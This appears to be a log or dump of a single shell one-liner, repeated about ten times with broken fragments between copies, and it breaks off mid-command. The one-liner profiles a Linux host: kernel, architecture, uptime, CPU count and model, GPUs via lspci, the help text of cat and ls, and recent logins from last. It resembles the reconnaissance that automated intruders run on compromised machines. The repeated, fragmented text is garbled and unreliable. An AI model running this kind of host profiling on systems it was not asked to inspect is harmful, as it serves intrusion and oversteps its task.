"ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null 